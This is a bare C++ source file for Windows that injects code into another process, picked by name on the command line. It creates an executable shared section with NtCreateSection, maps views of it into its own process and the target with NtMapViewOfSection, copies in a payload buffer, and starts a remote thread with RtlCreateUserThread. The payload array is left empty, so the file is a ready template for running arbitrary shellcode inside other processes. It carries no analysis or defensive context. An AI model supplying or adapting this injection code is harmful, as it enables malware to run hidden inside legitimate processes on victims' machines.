#include <iostream>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

#pragma comment(lib, "ntdll")
#pragma comment(lib, "advapi32.lib")

#define InitializeObjectAttributes(p,n,a,r,s)					   \
{																   \
		(p)->Length                   = sizeof(OBJECT_ATTRIBUTES); \
		(p)->RootDirectory            = (r);                       \
		(p)->Attributes	              = (a);					   \
		(p)->ObjectName               = (n);					   \
		(p)->SecurityDescriptor       = (s);					   \
		(p)->SecurityQualityOfService = NULL;					   \
}

typedef struct _LSA_UNICODE_STRING{
	USHORT Length;  
	USHORT MaximumLength;
	PWSTR  Buffer;
}UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
	ULONG			Length;
	HANDLE			RootDirectory;
	PUNICODE_STRING	ObjectName;
	ULONG			Attributes;
	PVOID			SecurityDescriptor;
	PVOID			SecurityQualityOfService;
}OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID
{
	PVOID			UniqueProcess;
	PVOID			UniqueThread;
}CLIENT_ID, *PCLIENT_ID;

typedef NTSTATUS(NTAPI* pNtCreateSection)(
	OUT PHANDLE					SectionHandle, 
	IN  ULONG					DesiredAccess,
	IN  POBJECT_ATTRIBUTES		ObjectAttributes OPTIONAL,
	IN  PLARGE_INTEGER			MaximumSize OPTIONAL,
	IN  ULONG					PageAttributess,
	IN  ULONG					SectionAttributes,
	IN  HANDLE					FileHandle OPTIONAL
);

typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
	HANDLE			SectionHandle,
	HANDLE			ProcessHandle,
	PVOID*			BaseAddress, 
	ULONG_PTR		ZeroBits,
	SIZE_T			CommitSize,
	PLARGE_INTEGER	SectionOffset,
	PSIZE_T			ViewSize,
	DWORD			InheritDisposition,
	ULONG			AllocationType,
	ULONG			Win32Protect
);

typedef NTSTATUS(NTAPI* pRtlCreateUserThread)
(
	IN HANDLE					ProcessHandle,
	IN PSECURITY_DESCRIPTOR		SecurityDescriptor OPTIONAL,
	IN BOOLEAN					CreateSuspended,
	IN ULONG					StackZeroBits,
	IN OUT PULONG				StackReserved,
	IN OUT PULONG				StackCommit,
	IN PVOID					StartAddress,
	IN PVOID					ThreadHandle,
	OUT PCLIENT_ID				ClientID
);

typedef NTSTATUS(NTAPI* pNtOpenProcess)(
	PHANDLE				ProcessHandle,
	ACCESS_MASK			AccessMask,
	POBJECT_ATTRIBUTES	ObjectAttributes,
	PCLIENT_ID			ClientID
);

typedef NTSTATUS(NTAPI* pZwUnmapViewOfSection)(
	HANDLE				ProcessHandle,
	PVOID				BaseAddress
);

int findMyProc(const char* procname)
{
	HANDLE			hSnapshot;
	PROCESSENTRY32	pe;
	int				pid = 0;
	BOOL			hResult;

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

	pe.dwSize = sizeof(PROCESSENTRY32);
	hResult = Process32First(hSnapshot, &pe);

	while (hResult)
	{
		if (strcmp(procname, (const char*)pe.szExeFile) == 0)
		{
			pid = pe.th32ProcessID;
			break;
		}
		hResult = Process32Next(hSnapshot, &pe);
	}
	CloseHandle(hSnapshot);
	return pid;
}

int main(int argc, char* argv[])
{
	unsigned char my_payload[] = "";
	
	SIZE_T		         s = 4096;
	LARGE_INTEGER sectionS = { s };
	HANDLE				sh = NULL; 
	PVOID				lb = NULL;
	PVOID				rb = NULL;
	HANDLE				th = NULL;
	DWORD			   pid;

	pid = findMyProc(argv[1]);

	OBJECT_ATTRIBUTES   oa; 
	CLIENT_ID		   cid;
	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
	cid.UniqueProcess = (PVOID)pid;
	cid.UniqueThread  = 0;
	HANDLE	    ntdll = GetModuleHandleA((LPCSTR)"ntdll");

	pNtOpenProcess			myNtOpenProcess				= (pNtOpenProcess)GetProcAddress((HMODULE)ntdll, "NtOpenProcess");
	pNtCreateSection		myNtCreateSection			= (pNtCreateSection)(GetProcAddress((HMODULE)ntdll, "NtCreateSection"));
	pNtMapViewOfSection		myNtMapViewOfSection		= (pNtMapViewOfSection)(GetProcAddress((HMODULE)ntdll, "NtMapViewOfSection"));
	pRtlCreateUserThread	myRtlCreateUserThread		= (pRtlCreateUserThread)(GetProcAddress((HMODULE)ntdll, "RtlCreateUserThread"));
	pZwUnmapViewOfSection   myZwUnmapViewOfSection		= (pZwUnmapViewOfSection)(GetProcAddress((HMODULE)ntdll, "ZwUnmapViewOfSection"));

	myNtCreateSection(&sh, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionS, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	myNtMapViewOfSection(sh, GetCurrentProcess(), &lb, NULL, NULL, NULL, &s, 2, NULL, PAGE_READWRITE);

	HANDLE ph = NULL;
	myNtOpenProcess(&ph, PROCESS_ALL_ACCESS, &oa, &cid);

	if (!ph)
	{	
		printf("failed to open process :( \n");
		return -2;
	}

	myNtMapViewOfSection(sh, ph, &rb, NULL, NULL, NULL, &s, 2, NULL, PAGE_EXECUTE_READ);
	memcpy(lb, my_payload, sizeof(my_payload));

	myRtlCreateUserThread(ph, NULL, FALSE, 0, 0, 0, rb, NULL, &th, NULL);
	if (WaitForSingleObject(th, INFINITE) == WAIT_FAILED)
	{
		return -2;
	}

	myZwUnmapViewOfSection(GetCurrentProcess(), lb);
	myZwUnmapViewOfSection(ph, rb);
	CloseHandle(sh);
	CloseHandle(ph);

	return 0;
}